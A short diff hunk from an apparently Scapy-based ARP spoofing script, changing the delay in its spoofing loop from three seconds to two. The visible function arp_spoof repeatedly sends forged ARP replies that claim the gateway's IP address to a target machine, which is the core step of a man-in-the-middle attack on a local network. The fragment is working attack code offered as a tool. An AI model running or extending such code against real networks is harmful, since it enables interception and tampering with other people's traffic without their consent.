@@ -33,7 +33,7 @@ def arp_spoof(target_ip, target_mac):
             protocol source = ip that we pretend we have(spoof)
             '''
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
-            time.sleep(3)
+            time.sleep(2)
     except KeyboardInterrupt:
         print("ARP Spoofing ended by keyboard interruption!")
 
